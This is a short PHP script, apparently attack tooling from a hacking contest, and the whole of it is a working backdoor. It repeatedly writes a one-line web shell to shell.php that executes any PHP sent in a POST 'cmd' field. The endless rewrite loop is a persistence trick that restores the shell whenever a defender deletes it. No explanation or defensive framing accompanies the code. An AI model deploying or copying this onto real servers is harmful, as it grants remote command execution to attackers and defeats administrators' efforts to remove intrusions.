<?php
$a = '<?php @eval($_POST[\'cmd\']);?>';
while (1) {
	file_put_contents("shell.php", $a);
	usleep(10);
}
echo "hacking";
?>